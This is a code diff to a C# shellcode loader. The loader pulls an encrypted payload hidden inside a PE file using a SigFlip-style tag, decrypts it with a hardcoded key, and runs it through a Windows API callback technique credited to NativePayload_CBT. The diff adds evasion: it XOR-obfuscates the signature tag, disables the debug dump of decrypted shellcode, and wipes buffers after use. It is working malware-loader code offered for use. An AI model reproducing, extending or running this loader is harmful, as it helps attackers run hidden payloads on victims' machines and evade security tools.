@@ -18,17 +18,8 @@ public class codebase
 	[DllImport("kernel32")]
 	private static extern IntPtr VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
 	
-	[DllImport("kernel32")]
-	private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
-	   
     [DllImport("kernel32.dll")]
     private static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);
-
-    [DllImport("kernel32.dll")]
-    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
-
-    [DllImport("kernel32.dll")]
-    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
 
     [DllImport("user32.dll")]
     private static extern IntPtr GetTopWindow(IntPtr hwnd);
@@ -36,12 +27,19 @@ public class codebase
     // Execution technique from here https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/NativePayload_EnumPropsExW.cs
     [DllImport("user32.dll")]
     private static extern int EnumPropsExW(IntPtr hwnd, IntPtr lpenumfunc, IntPtr lparam);
+    
+    // Encrypted location tag from SigFlip
+    public static byte[] location = { 0xb5, 0xa1, 0xab, 0x83, 0xbd, 0xaf, 0xbb, 0x94 };
+    public static string key = "KLQMCBAZIQHUMTGJW";
 
-    public delegate void AsyncCallBack();
-    
-    // Static tag from SigFlip - Modify in SigFlip and below for better evasion!
-    public static byte[] _tag = { 0xfe, 0xed, 0xfa, 0xce, 0xfe, 0xed, 0xfa, 0xce };
-    
+    // XOR decrypt function
+    public static byte[] XOR(byte[] data, System.String key)
+    {
+        for (int i = 0; i < data.Length; i++)
+            data[i] = ((byte)(data[i] ^ key[(i % key.Length)]));
+        return data;
+    }
+
     // Read input file
     public static byte[] Read(string filePath)
     {
@@ -145,29 +143,33 @@ public class codebase
         // This should be your binary you wanna inject into . 
         byte[] _peBlob = Read(".\\myTest.exe");
 
-        int _dataOffset = scanPattern(_peBlob, _tag);
+        // Decrypt location tag
+        byte[] tag = XOR(location, key);
+
+        int _dataOffset = scanPattern(_peBlob, tag);
 
         Stream stream = new MemoryStream(_peBlob);
-        long pos = stream.Seek(_dataOffset + _tag.Length, SeekOrigin.Begin);
+        long pos = stream.Seek(_dataOffset + tag.Length, SeekOrigin.Begin);
 
-        byte[] regfile = new byte[_peBlob.Length+4 - (pos + _tag.Length)];
-        //byte[] regfile = new byte[_peBlob.Length+2 - (pos + _tag.Length)];
+        byte[] regfile = new byte[_peBlob.Length+4 - (pos + tag.Length)];
+        //byte[] regfile = new byte[_peBlob.Length+2 - (pos + tag.Length)];
 
-        stream.Read(regfile, 0, (_peBlob.Length+4) - ((int)pos + _tag.Length));
-        //stream.Read(regfile, 0, (_peBlob.Length+2) - ((int)pos + _tag.Length));
+        stream.Read(regfile, 0, (_peBlob.Length+4) - ((int)pos + tag.Length));
+        //stream.Read(regfile, 0, (_peBlob.Length+2) - ((int)pos + tag.Length));
 
         // Decryption routine - Replace the below hardcoded key with your password
         byte[] assemblyFile = unregister(regfile, "KeyzKeyz");
 
         // Output decrypted shellcode to file for comparison to original shellcode
-        WriteFile(".\\debug-DecryptedScode.txt", assemblyFile);
+        // UNCOMMENT below line to debug decrytped shellcode
+        //WriteFile(".\\debug-DecryptedScode.txt", assemblyFile);
         	
         stream.Close();
 
         // Cleanup
-        //Array.Clear(shellcode, 0, shellcode.Length);
-        //_dataOffset = 0;
-        //pos = 0;
+        Array.Clear(regfile, 0, regfile.Length);
+        _dataOffset = 0;
+        pos = 0;
 
         // Execute the decrypted Shellcode 
         registered(assemblyFile);
